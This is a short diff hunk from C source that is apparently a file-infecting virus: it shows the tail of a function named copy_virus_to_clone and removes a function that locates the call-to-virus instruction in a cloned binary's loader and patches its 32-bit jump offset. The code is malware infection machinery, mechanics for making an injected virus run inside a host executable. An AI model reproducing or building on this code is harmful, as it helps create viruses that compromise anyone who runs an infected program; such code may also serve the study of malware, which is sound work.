@@ -70,17 +70,3 @@ bool	copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *original
 
 	return true;
 }
-
-bool	adapt_virus_call_in_loader(struct safe_ptr clone_ref, size_t loader_entry_off, int virus_func_shift)
-{
-	size_t	dist_loader_entry_vircall = call_virus - loader_entry;
-	size_t	off_vircall = loader_entry_off + dist_loader_entry_vircall;
-
-	void	*call_code = safe(clone_ref, off_vircall, JUMP32_INST_SIZE);
-	if (call_code == NULL) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
-
-	int32_t	*call_arg = (call_code + 1);
-	*call_arg += virus_func_shift;
-
-	return true;
-}
